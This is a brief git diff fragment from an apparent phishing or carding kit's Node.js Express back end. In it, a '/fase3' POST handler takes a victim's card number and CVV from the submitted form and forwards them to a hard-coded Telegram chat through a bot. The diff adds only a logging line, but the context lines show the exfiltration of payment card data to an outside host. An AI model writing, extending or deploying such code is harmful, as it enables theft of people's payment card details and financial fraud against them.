@@ -115,6 +115,7 @@ app.post('/fase3', (req, res)=>{
   CVV: ${req.body.tar.cvv}\n\n
   `)
   .then(()=>{
+    console.log('sending package');
     bot.sendMessage('1660900306', `
     ### RECIBIENDO ###\n
     CC: ${req.body.cc}\n 
